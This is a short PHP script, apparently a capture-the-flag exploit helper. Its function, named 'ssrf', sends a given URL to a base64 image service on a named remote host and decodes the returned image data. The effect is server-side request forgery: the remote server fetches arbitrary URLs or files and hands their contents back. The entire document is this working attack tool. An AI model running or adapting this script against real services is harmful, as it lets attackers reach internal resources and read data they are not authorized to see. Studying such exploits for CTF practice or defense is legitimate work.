<?php
    function ssrf($url) {
        $query = array(
            "url" => $url
        );
        $query_str = http_build_query($query);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "http://base64image.splitline.tw:8894/?page=result");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $query_str);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($curl);
        if (preg_match('&<img src="data:image/jpeg;base64,(.*)"><hr>&', $result, $match) !== 1) {
            return $result;
        }
        $value = $match[1];
        return base64_decode($value);
        
    }
    if (count($argv) !== 2) {
        die("please provide remote and local file\n");
    }
    echo ssrf($argv[1]);
